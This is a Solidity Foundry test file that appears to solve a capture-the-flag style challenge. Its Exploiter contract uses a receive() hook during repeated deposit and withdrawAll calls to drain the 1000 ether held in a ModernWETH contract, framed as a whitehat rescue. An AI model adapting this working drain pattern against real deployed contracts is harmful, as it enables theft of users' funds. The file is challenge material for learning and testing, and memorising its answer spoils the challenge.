// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {ModernWETH} from "../src/2_ModernWETH/ModernWETH.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

contract Exploiter {
    address public whitehat;
    ModernWETH public modernWETH;
    bool private _exploitStarted;

    constructor(address _whitehat, address _modernWETH) {
        whitehat = _whitehat;
        modernWETH = ModernWETH(_modernWETH);
    }

    function exploit() public {
        _exploitStarted = true;

        while (modernWETH.balanceOf(whitehat) < 1000 ether) {
            modernWETH.deposit{value: 10 ether}();
            modernWETH.withdrawAll();
        }
        // send back the hack funds
        payable(whitehat).transfer(address(this).balance);
    }

    receive() external payable {
        if (!_exploitStarted) {
            return;
        }

        modernWETH.transfer(
            address(whitehat),
            modernWETH.balanceOf(address(this))
        );
    }
}

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge2Test is Test {
    ModernWETH public modernWETH;
    address public whitehat = makeAddr("whitehat");

    function setUp() public {
        modernWETH = new ModernWETH();

        /// @dev contract has locked 1000 ether, deposited by a whale, you must rescue it
        address whale = makeAddr("whale");
        vm.deal(whale, 1000 ether);
        vm.prank(whale);
        modernWETH.deposit{value: 1000 ether}();

        /// @dev you, the whitehat, start with 10 ether
        vm.deal(whitehat, 10 ether);
    }

    function testWhitehatRescue() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge2Test -vvvv //
        ////////////////////////////////////////////////////*/

        Exploiter ctr = new Exploiter(whitehat, address(modernWETH));

        payable(address(ctr)).transfer(10 ether);
        ctr.exploit();

        // exchange mWETH amount for ETH
        modernWETH.withdrawAll();

        //==================================================//
        vm.stopPrank();

        assertEq(
            address(modernWETH).balance,
            0,
            "ModernWETH balance should be 0"
        );
        // @dev whitehat should have more than 1000 ether plus 10 ether from initial balance after the rescue
        assertEq(
            address(whitehat).balance,
            1010 ether,
            "whitehat should end with 1010 ether"
        );
    }
}
